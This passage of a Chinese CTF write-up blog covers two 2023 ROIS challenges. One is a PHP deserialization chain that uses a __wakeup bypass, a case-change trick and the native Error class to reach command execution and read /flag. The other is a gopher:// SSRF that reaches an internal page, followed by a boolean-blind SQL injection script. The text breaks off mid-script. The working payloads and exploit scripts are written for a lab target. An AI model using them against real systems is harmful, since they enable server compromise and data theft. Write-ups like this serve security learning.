class="hljs-variable">$pop</span>-&gt;left=[<span class="hljs-number">1</span>];<br><span class="hljs-variable">$pop</span>-&gt;right=[<span class="hljs-number">2</span>];<br><span class="hljs-variable">$pip</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">pipimi</span>();<br><span class="hljs-variable">$pip</span>-&gt;a=<span class="hljs-variable">$pop</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pip</span>);<br></code></pre></td></tr></table></figure><p><img src="/2023/02/10/ROIS/image-20230406153731384.png"></p><p>漏洞存在，注意到popko类中的__wakeup()方法若执行会将left和right的值清空，_call()方法体的条件无法满足因此要绕过__wakeup()方法，</p><p>将生成的exp进行修改：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;popko&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br><span class="hljs-comment">//将popko的对象数2改为比2大的数</span><br>O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>注意到函数主体部分有判断语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>], <span class="hljs-string">&quot;popko&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>]);<br>    &#125;<br></code></pre></td></tr></table></figure><p>strrstr()函数区分大小写，但是php类不区分大小写，进行大写绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>GET传入c</p><p><img src="/2023/02/10/ROIS/image-20230406170242128.png"></p><p>进入后门后查看backdoor()函数体：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>    <span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;d&quot;</span>];<br>    <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;e&quot;</span>];<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;f&quot;</span>];<br>    <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;g&quot;</span>];<br>    <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$d</span>, <span class="hljs-variable">$e</span>);<br>    <span class="hljs-variable">$str2</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$f</span>, <span class="hljs-variable">$g</span>);<br>    <span class="hljs-variable">$str1</span>(<span class="hljs-variable">$str2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>$a是一个类，向类$a中传入参数$b返回值赋值给$class。但是并未定义这样一个满足条件的类，这时候就要去学习php原生类的知识了。查找到原生类ERROR。</p><p><img src="/2023/02/10/ROIS/image-20230406171445334.png"></p><p>可以看到返回值前面几个字符为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">Error</span>: <span class="hljs-number">12345</span><span class="hljs-comment">#注意引号和字符串&quot;12345&quot;之间有个空格</span><br></code></pre></td></tr></table></figure><p>目的就很明确了，$a为ERROR原生类，$b为一个由命令执行函数和执行的命令组成的字符串。$d和$e代表命令执行函数在ERROR返回值中的首位置和命令执行函数的长度，$f和$g代表所执行的命令在ERROR返回值中的首位置和长度进行截取。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;ERROR&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;systemls&quot;</span><br><span class="hljs-comment">#此时error返回Error: systemls，其中s位于第七个位置，&quot;system&quot;长度6，同理，l位于13，&quot;ls&quot;长度2，则</span><br><span class="hljs-variable">$d</span> = <span class="hljs-number">7</span>;<br><span class="hljs-variable">$e</span> = <span class="hljs-number">6</span>;<br><span class="hljs-variable">$f</span> = <span class="hljs-number">13</span>;<br><span class="hljs-variable">$g</span> = <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p>GET传入a、b、d、e、f、g对应的值。</p><p><img src="/2023/02/10/ROIS/image-20230406172912264.png"></p><p>命令执行成功了。</p><p>对b、d、e、f、g进行修改，发现根目录下存在flag。</p><p><img src="/2023/02/10/ROIS/image-20230406173119381.png"></p><p>最终payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;&amp;a=<span class="hljs-built_in">Error</span>&amp;b=systemcat /flag&amp;d=<span class="hljs-number">7</span>&amp;e=<span class="hljs-number">6</span>&amp;f=<span class="hljs-number">13</span>&amp;g=<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/10/ROIS/image-20230406173259433.png"></p>]]></content>
    
    
    <categories>
      
      <category>做题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Misc</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2023/02/09/SSRF/"/>
    <url>/2023/02/09/SSRF/</url>
    
    <content type="html"><![CDATA[<h2 id="2023ROIS冬令营internal"><a href="#2023ROIS冬令营internal" class="headerlink" title="2023ROIS冬令营internal"></a>2023ROIS冬令营internal</h2><p>这是什么，两个超链接，点一下（</p><p><img src="/2023/02/09/SSRF/image-20230410150245999.png"></p><p>​SQLI页面中的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try to access it from internal!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome!\n&quot;</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(DB_HOST, DB_USER, DB_PASS, DB_DATABASE);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM messages WHERE id=<span class="hljs-subst">$id</span>&quot;</span>; <span class="hljs-comment">// SQLI &gt;_&lt;</span><br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>)[<span class="hljs-string">&#x27;message&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$message</span>;<br><span class="hljs-comment">#回显Try to access it from internal!</span><br></code></pre></td></tr></table></figure><p><code>if ($_SERVER[&#39;REMOTE_ADDR&#39;] !== &#39;127.0.0.1&#39;)</code>用户访问的IP必须是本地IP才能进行下面的数据库操作等步骤，也就是说只有通过网页服务器内网访问。如果我们能够通过这个服务器中的另外一个不限制于内网访问的页面，把它当做跳板间接对这个仅内网访问的页面进行操作，就能进行传参等操作。也就是实现SSRF。先看另外一个页面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Hint: Do you know gopher?</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file:|ftp:|http:|scp:|dict:/i&quot;</span>,<span class="hljs-variable">$url</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br></code></pre></td></tr></table></figure><p><code>curl_init()</code>函数初始化一个curl绘会话，值传给<code>$ch</code>，<code>curl_exec()</code>函数执行一个curl会话，值传给<code>$res</code>。最后将结果打印出来。既然可以执行curl，那么不就意味着可以通过这个页面对SQLI页面进行传参等操作了吗。给出了提示：<code>&quot;Do you know gopher?&quot;</code>。emmm。。。并不知道。那就学呗。找到了一篇<a href="https://zhuanlan.zhihu.com/p/112055947">讲的比较详细的文章</a>学习了一下。</p><p>gopher是啥？它是一种协议，支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。</p><p>gopher协议的格式：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">gopher:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/_</span>后接<span class="hljs-title class_">TCP</span>数据流<br></code></pre></td></tr></table></figure><p>需要注意的是，TCP数据流必须是经过url编码的，并且回车和换行必须是<code>%0D%0A</code>，使用脚本或工具编码后回车换行会变成<code>%0A</code>，因此要多一步replace的步骤。在HTTP包的最后要加<code>%0D%0A</code>，代表消息结束（具体可研究HTTP包结束）。以下是通过gopher协议传参的一次示例：</p><p>GET请求：</p><p>准备好一个监听机和一个用户机：</p><p><img src="/2023/02/09/SSRF/image-20230410153558433.png"></p><p><code>nc -lp 1234</code>监听1234端口，使用curl发送http请求<code>curl gopher://172.17.0.1:1234/abcd</code>，监听机收到消息为”bcd”；发送请求<code>curl gopher://172.17.0.1:1234/aabcd</code>nc监听到abcd。因此紧跟在<code>&quot;&lt;PORT&gt;/&quot;</code>字符后面的一个字符会被忽略，可换为任意一个字符。</p><p><img src="/2023/02/09/SSRF/image-20230410182351129.png"></p><p>这是一段网页源码，作用是将GET传入的name的值打印出来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure><p>这是一个GET请求包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/ssrf.php?name=Potatowo</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.17.0.1<br>#回车<br></code></pre></td></tr></table></figure><p>经Python脚本编写，生成对应的请求包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;GET /ssrf.php?name=Margin HTTP/1.1</span><br><span class="hljs-string">Host: 172.17.0.1</span><br><span class="hljs-string">#该行要有回车，HTTP数据包结尾</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<span class="hljs-comment">#此处将&quot;%0A&quot;替换成&quot;%0D%0A&quot;</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A</span><br></code></pre></td></tr></table></figure><p>改为构成符合gopher协议的请求后通过curl发出请求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl gopher://172.17.0.1:8080/_GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A<br><span class="hljs-comment">#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。</span><br></code></pre></td></tr></table></figure><p>POST请求：</p><p>这是一段网页源码，功能不做过多赘述：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure><p>这是一个POST请求包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ssrf/base/post.php</span> <span class="hljs-meta">HTTP/1.1</span><br>host:172.17.0.1<br>Content-Type:application/x-www-form-urlencoded<br>Content-Length:11<br><br><span class="language-ini"><span class="hljs-attr">name</span>=Potatowo</span><br><span class="language-ini"><span class="hljs-comment">#回车</span></span><br></code></pre></td></tr></table></figure><p>改为构成符合gopher协议的请求后通过curl发出请求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl gopher://172.17.0.1:8080/_POST%20/ssrf/base/post.php%20HTTP/1.1%0D%0Ahost%3A172.17.0.1%0D%0AContent-Type%3Aapplication/x-www-form-urlencoded%0D%0AContent-Length%3A11%0D%0Aname%3DPotatowo%0D%0A%0D%0A<br><span class="hljs-comment">#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。</span><br></code></pre></td></tr></table></figure><p>现在回到本题；</p><p>既然用得到请求包，那就先bp抓包，对SQLI页面传参，那就抓SQLI页面的包：</p><p><img src="/2023/02/09/SSRF/image-20230410194114453.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1#使用脚本时删掉该注释，此处要把原包ip改为改为127.0.0.1</span><br><span class="hljs-string">Content-Length: 4</span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=1</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = result = urllib.parse.quote(result)<br><span class="hljs-comment">#要注意！！如果是希望在浏览器里传参，则要编码两次！！浏览器会自动解码一次，后端解码一次；但是像下面</span><br><span class="hljs-comment">#要讲的用python的requests库直接传参就只需要编码一次因为不需要经过浏览器解码</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%25204%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/109.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250Aid%253D1%250D%250A%250D%250A</span><br><br></code></pre></td></tr></table></figure><p>改为符合gopher协议的形式，注意由于<code>curl_exec()</code>的执行是在服务端里进行的，所以<code>gopher://</code>协议的地址应改为<code>127.0.0.1:80</code>，80端口是跑web服务的端口。</p><p><img src="/2023/02/09/SSRF/image-20230410201414804.png"></p><p>将脚本中的content进行修改，<code>content = &quot;id=1 and 1=1&quot;</code>，传入，结果：</p><p><img src="/2023/02/09/SSRF/image-20230411013245234.png"></p><p>emmm。。这时候突然想起来SQLI页面是不是有过滤来着赶紧打开看了眼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>看来是ban掉了union和空格。难怪，那改成<code>content = &quot;id=1/**/and/**/1=1&quot;</code>绕过空格过滤，回显<code>&quot;Welcome! meow meow meow~1&quot;</code>，改成<code>content = &quot;id=1/**/and/**/1=2&quot;</code>，回显<code>&quot;Welcome! 1&quot;</code>。sql语句判断为真会返回<code>&quot;Welcome! meow meow meow~1&quot;</code>，为假不含<code>meow meow meow~</code>，同时union被ban了，尝试用加号拼接<code>&quot;uni&quot;</code>,<code>&quot;on&quot;</code>，结果加号url编码与空格相同（悲，现在意图也比较明显了，布尔盲注。</p><p>完善脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">126</span>):<br>    content = <span class="hljs-string">&quot;id=1 and (length(database())=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    content = content.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>)<span class="hljs-comment">#SQL页面存在空格过滤用/**/绕过</span><br>    content_length = <span class="hljs-built_in">len</span>(content)<br>    data = \<span class="hljs-comment">#切记切记下面字符串每行左边要贴边，不然tab会被编码</span><br><span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;content_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;content&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>    result = urllib.parse.quote(data)<br>    result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>    payload = <span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+result<span class="hljs-comment">#用python直接传参只需要编码一次</span><br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;url&quot;</span>:payload&#125;).text<br>    <span class="hljs-comment">#print(r)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow&quot;</span> <span class="hljs-keyword">in</span> r:<span class="hljs-comment">#如果sql返回为真，页面会显示&quot;meow meow~&quot;</span><br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#3</span><br></code></pre></td></tr></table></figure><p>输出3，得出数据库长度为3。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 